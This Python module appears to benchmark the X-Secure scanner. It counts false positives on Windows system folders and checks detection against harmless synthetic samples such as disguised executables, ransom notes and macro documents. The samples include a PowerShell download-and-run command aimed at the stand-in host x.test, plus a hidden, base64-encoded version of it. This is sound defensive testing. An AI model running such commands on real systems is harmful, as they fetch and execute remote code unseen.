"""Detection / false-positive benchmark.

* False positives: scans a clean corpus (by default Windows' own System32 folder plus Program Files, which are
  vendor-installed software) without the cache, and reports how many files were flagged and why.
* Detection: builds HARMLESS synthetic samples of every technique the scanner claims to catch (disguised and
  double-extension programs, encoded/downloading PowerShell, macro documents, programs inside archives, hidden
  ADS payloads, ransom notes...) and reports which ones are detected. These are not real malware, so this measures
  whether each detection works, not how well X-Secure does against malware in the wild.
"""
from __future__ import annotations

import base64
import collections
import os
import shutil
import tempfile
import time
import zipfile
from pathlib import Path

from .scanner import CLEAN, ERROR, Scanner


def default_corpus() -> list:
    win = os.environ.get("SystemRoot", r"C:\Windows")
    roots = [Path(win) / "System32"]
    for env in ("ProgramFiles", "ProgramFiles(x86)"):
        if os.environ.get(env):
            roots.append(Path(os.environ[env]))
    return [r for r in roots if r.is_dir()]


def _synthetic(d: Path) -> list:
    """[(label, path)] of harmless samples that each exercise one detection."""
    pe = b"MZ" + b"\0" * 400
    enc = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')".encode("utf-16-le"))
    out = []

    def put(label, name, data):
        p = d / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(data)
        out.append((label, p))
        return p
    put("program disguised as a PDF", "invoice.pdf", pe)
    put("double extension", "photo.jpg.exe", pe)
    put("encoded PowerShell command", "update.ps1", b"powershell -nop -w hidden -enc " + enc)
    put("PowerShell download-and-run", "get.ps1", b"IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')")
    put("UTF-16 encoded script", "u16.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
        .encode("utf-16"))
    put("ransom note", "HOW_TO_DECRYPT_FILES.txt", b"Your files are encrypted. Pay bitcoin to recover them.")
    put("ransomware extension", "report.docx.locked", b"\x8a\x13" * 200)
    z = d / "docs.zip"
    with zipfile.ZipFile(z, "w") as zf:
        zf.writestr("statement.pdf.exe", pe)
    out.append(("program hidden in a zip", z))
    m = d / "salary.docm"
    with zipfile.ZipFile(m, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types/>")
        zf.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0" + b"AutoOpen Shell powershell" * 4)
    out.append(("macro-enabled Office document", m))
    if os.name == "nt":
        host = put("program hidden in an alternate data stream", "readme.txt", b"just text")
        with open(f"{host}:payload.exe", "wb") as h:
            h.write(pe)
    return out


def run(corpus=None, limit: int = 20000, progress=None, workers=None) -> dict:
    """Uses the real parallel scan engine (cache off, so every file is really scanned)."""
    import threading
    from .engine import ScanEngine
    sc = Scanner(log=False)
    roots = [Path(r) for r in (corpus or default_corpus())]
    flagged: list = []
    reasons: collections.Counter = collections.Counter()
    eng = ScanEngine(workers=workers, use_cache=False)
    stop = threading.Event()
    t0 = time.time()
    last = 0
    from .engine import default_excludes
    for r in eng.scan(roots, exclude=default_excludes(), cancel=stop):
        if r.verdict not in (CLEAN, ERROR):
            flagged.append((r.path, r.verdict, r.score, r.reasons))
            reasons.update(x.split(":")[0].split(" (")[0] for x in r.reasons)
        if progress and eng.stats.files - last >= 1000:
            last = eng.stats.files
            progress(last)
        if eng.stats.files >= limit:
            stop.set()
    files, errors = eng.stats.files, eng.stats.errors
    fp_secs = time.time() - t0

    d = Path(tempfile.mkdtemp(prefix="xsecure_bench_"))
    try:
        det = [(label, sc.scan_file(p)) for label, p in _synthetic(d)]
    finally:
        shutil.rmtree(d, ignore_errors=True)
    return {
        "corpus": [str(r) for r in roots], "files": files, "errors": errors, "seconds": round(fp_secs, 1),
        "flagged": flagged, "fp_rate": (len(flagged) / max(1, files - errors)), "top_reasons": reasons.most_common(8),
        "detection": [(label, r.verdict, r.score) for label, r in det],
        "detected": sum(1 for _, r in det if r.verdict != CLEAN), "samples": len(det),
    }


def report(res: dict) -> str:
    lines = [f"Clean corpus: {', '.join(res['corpus'])}",
             f"  {res['files']:,} files scanned in {res['seconds']}s ({res['errors']} unreadable), "
             f"{len(res['flagged'])} flagged -> false-positive rate {res['fp_rate'] * 100:.3f}%"]
    for reason, n in res["top_reasons"]:
        lines.append(f"    {n:4}  {reason}")
    for p, v, s, why in res["flagged"][:15]:
        lines.append(f"    {v:10} {s:3}  {p}")
    lines.append(f"Synthetic detection samples (harmless, one per technique): {res['detected']}/{res['samples']} detected")
    for label, v, s in res["detection"]:
        lines.append(f"    {'OK  ' if v != CLEAN else 'MISS'} {label:45} {v} ({s})")
    return "\n".join(lines)
